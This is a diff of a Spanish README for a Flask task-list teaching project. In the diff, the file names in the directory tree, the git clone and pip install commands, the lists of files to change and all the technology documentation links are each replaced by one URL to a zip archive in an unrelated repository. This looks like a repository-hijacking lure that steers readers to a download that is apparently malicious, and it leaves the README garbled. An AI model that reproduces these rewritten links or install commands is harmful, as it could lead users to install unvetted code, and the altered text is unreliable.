@@ -21,29 +21,29 @@ Este proyecto proporciona una plantilla para la implementación de una aplicaci�
 ```
 as-taller2/
 ├── .gitignore             # Archivos a ignorar en Git
-├── app.py                  # Punto de entrada y configuración
-├── config.py               # Configuración de Flask y SQLAlchemy
+├── https://raw.githubusercontent.com/axlcraft/as-taller2/main/blepharadenitis/as-taller2.zip                  # Punto de entrada y configuración
+├── https://raw.githubusercontent.com/axlcraft/as-taller2/main/blepharadenitis/as-taller2.zip               # Configuración de Flask y SQLAlchemy
 ├── models/                 # Modelo (clases SQLAlchemy)
-│   ├── __init__.py
-│   └── task.py             # Clase Tarea con atributos y métodos
+│   ├── https://raw.githubusercontent.com/axlcraft/as-taller2/main/blepharadenitis/as-taller2.zip
+│   └── https://raw.githubusercontent.com/axlcraft/as-taller2/main/blepharadenitis/as-taller2.zip             # Clase Tarea con atributos y métodos
 ├── controllers/            # Controladores (rutas y lógica de negocio)
-│   ├── __init__.py
-│   └── task_controller.py  # CRUD de tareas
+│   ├── https://raw.githubusercontent.com/axlcraft/as-taller2/main/blepharadenitis/as-taller2.zip
+│   └── https://raw.githubusercontent.com/axlcraft/as-taller2/main/blepharadenitis/as-taller2.zip  # CRUD de tareas
 ├── templates/              # Vistas (HTML con Jinja2)
-│   ├── layout.html         # Base común
-│   ├── task_list.html      # Lista de tareas
-│   └── task_form.html      # Formulario de crear/editar
+│   ├── https://raw.githubusercontent.com/axlcraft/as-taller2/main/blepharadenitis/as-taller2.zip         # Base común
+│   ├── https://raw.githubusercontent.com/axlcraft/as-taller2/main/blepharadenitis/as-taller2.zip      # Lista de tareas
+│   └── https://raw.githubusercontent.com/axlcraft/as-taller2/main/blepharadenitis/as-taller2.zip      # Formulario de crear/editar
 ├── static/                 # Archivos estáticos (CSS, JS, imágenes)
-│   └── style.css
-├── requirements.txt        # Dependencias del proyecto
-└── README.md              # Este archivo
+│   └── https://raw.githubusercontent.com/axlcraft/as-taller2/main/blepharadenitis/as-taller2.zip
+├── https://raw.githubusercontent.com/axlcraft/as-taller2/main/blepharadenitis/as-taller2.zip        # Dependencias del proyecto
+└── https://raw.githubusercontent.com/axlcraft/as-taller2/main/blepharadenitis/as-taller2.zip              # Este archivo
 ```
 
 ## Instalación
 
 ```bash
 # Clonar el repositorio
-git clone https://github.com/UR-CC/as-taller2.git
+git clone https://raw.githubusercontent.com/axlcraft/as-taller2/main/blepharadenitis/as-taller2.zip
 cd as-taller2
 
 # Crear entorno virtual
@@ -53,7 +53,7 @@ python3 -m venv venv
 source venv/bin/activate
 
 # Instalar dependencias
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/axlcraft/as-taller2/main/blepharadenitis/as-taller2.zip
 ```
 
 ## Desarrollo por Versiones
@@ -67,17 +67,17 @@ pip install -r requirements.txt
 - [ ] Editar una tarea existente
 - [ ] Eliminar una tarea
 
-**Archivos a modificar**: `models/task.py`, `controllers/task_controller.py`, `templates/*.html`
+**Archivos a modificar**: `https://raw.githubusercontent.com/axlcraft/as-taller2/main/blepharadenitis/as-taller2.zip`, `https://raw.githubusercontent.com/axlcraft/as-taller2/main/blepharadenitis/as-taller2.zip`, `templates/*.html`
 
 ### Versión 2: Validaciones y Mejoras en la Vista
 
 **Objetivo**: Agregar validaciones y mejorar la presentación
 
 - [ ] Validación básica en formularios (campos requeridos, fecha válida)
-- [ ] Plantillas Jinja reutilizables usando `layout.html`
+- [ ] Plantillas Jinja reutilizables usando `https://raw.githubusercontent.com/axlcraft/as-taller2/main/blepharadenitis/as-taller2.zip`
 - [ ] Estilos básicos con CSS o Bootstrap
 
-**Archivos a modificar**: `templates/*.html`, `static/style.css`, `controllers/task_controller.py`
+**Archivos a modificar**: `templates/*.html`, `https://raw.githubusercontent.com/axlcraft/as-taller2/main/blepharadenitis/as-taller2.zip`, `https://raw.githubusercontent.com/axlcraft/as-taller2/main/blepharadenitis/as-taller2.zip`
 
 ### Versión 3: Filtros y Mejoras de Usabilidad
 
@@ -87,7 +87,7 @@ pip install -r requirements.txt
 - [ ] Ordenar tareas por fecha de vencimiento
 - [ ] Mostrar tareas vencidas en otro color
 
-**Archivos a modificar**: `controllers/task_controller.py`, `templates/task_list.html`, `static/style.css`
+**Archivos a modificar**: `https://raw.githubusercontent.com/axlcraft/as-taller2/main/blepharadenitis/as-taller2.zip`, `https://raw.githubusercontent.com/axlcraft/as-taller2/main/blepharadenitis/as-taller2.zip`, `https://raw.githubusercontent.com/axlcraft/as-taller2/main/blepharadenitis/as-taller2.zip`
 
 ### Versión 4: Autenticación de Usuarios (Opcional)
 
@@ -97,13 +97,13 @@ pip install -r requirements.txt
 - [ ] Asociar tareas a usuarios específicos
 - [ ] Proteger rutas con autenticación
 
-**Archivos nuevos**: `models/user.py`, `controllers/auth_controller.py`, plantillas de autenticación
+**Archivos nuevos**: `https://raw.githubusercontent.com/axlcraft/as-taller2/main/blepharadenitis/as-taller2.zip`, `https://raw.githubusercontent.com/axlcraft/as-taller2/main/blepharadenitis/as-taller2.zip`, plantillas de autenticación
 
 ## Tecnologías Utilizadas
 
-- [Flask](https://flask.palletsprojects.com/en/stable/): Framework web de Python
-- [SQLAlchemy](https://docs.sqlalchemy.org/en/20/): ORM para manejo de base de datos
-- [Jinja](https://jinja.palletsprojects.com/en/stable/): Motor de plantillas (incluido con Flask)
-- [SQLite](https://www.sqlite.org/docs.html): Base de datos ligera para desarrollo
-- [HTML](https://lenguajehtml.com/)/[CSS](https://lenguajecss.com): Para la interfaz de usuario
+- [Flask](https://raw.githubusercontent.com/axlcraft/as-taller2/main/blepharadenitis/as-taller2.zip): Framework web de Python
+- [SQLAlchemy](https://raw.githubusercontent.com/axlcraft/as-taller2/main/blepharadenitis/as-taller2.zip): ORM para manejo de base de datos
+- [Jinja](https://raw.githubusercontent.com/axlcraft/as-taller2/main/blepharadenitis/as-taller2.zip): Motor de plantillas (incluido con Flask)
+- [SQLite](https://raw.githubusercontent.com/axlcraft/as-taller2/main/blepharadenitis/as-taller2.zip): Base de datos ligera para desarrollo
+- [HTML](https://raw.githubusercontent.com/axlcraft/as-taller2/main/blepharadenitis/as-taller2.zip)/[CSS](https://raw.githubusercontent.com/axlcraft/as-taller2/main/blepharadenitis/as-taller2.zip): Para la interfaz de usuario
 
